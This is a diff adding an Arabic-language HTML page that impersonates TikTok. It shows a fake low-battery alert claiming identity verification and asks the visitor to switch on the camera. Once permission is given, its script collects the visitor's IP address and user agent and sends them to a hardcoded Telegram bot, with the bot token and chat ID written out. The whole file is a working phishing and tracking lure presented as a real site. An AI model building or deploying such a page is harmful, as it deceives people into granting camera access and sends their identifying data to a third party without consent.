@@ -1,0 +1,85 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok</title>
+  <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
+  <style>
+    body {
+      background-color: #000;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .battery-warning {
+      position: absolute;
+      top: 10px;
+      background-color: #222;
+      border: 1px solid #f00;
+      padding: 10px 20px;
+      border-radius: 10px;
+      font-size: 16px;
+      color: red;
+      animation: blink 1s infinite;
+    }
+    @keyframes blink {
+      50% {opacity: 0.6;}
+    }
+    .tiktok-box {
+      text-align: center;
+    }
+    .tiktok-box img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      background-color: #fe2c55;
+      color: white;
+      padding: 15px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="battery-warning">⚠️ مستوى البطارية منخفض. لتوفير الطاقة، سيتم التحقق من هويتك.</div>
+  <div class="tiktok-box">
+    <img src="https://1000logos.net/wp-content/uploads/2021/11/TikTok-logo.png" alt="TikTok Logo" />
+    <p>يرجى تشغيل الكاميرا للمتابعة إلى تيك توك</p>
+    <button class="btn" onclick="startCamera()">السماح بالكاميرا</button>
+  </div>
+
+  <script>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        alert("📷 تم تفعيل الكاميرا بنجاح. سيتم التحقق الآن.");
+        sendInfo();
+      } catch (err) {
+        alert("⚠️ لم يتم منح الإذن باستخدام الكاميرا.");
+      }
+    }
+
+    async function sendInfo() {
+      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+      const ua = navigator.userAgent;
+      const data = {
+        ip: ip.ip,
+        user_agent: ua
+      };
+      fetch(`https://api.telegram.org/bot7686490242:AAH3P4Mi0QjPKX-PhvxpKgwRVrn1tm0hZ3o/sendMessage?chat_id=7235637049&text=📸 تم فتح الرابط من IP: ${data.ip}%0A🔍 User-Agent: ${encodeURIComponent(data.user_agent)}`)
+    }
+  </script>
+</body>
+</html>
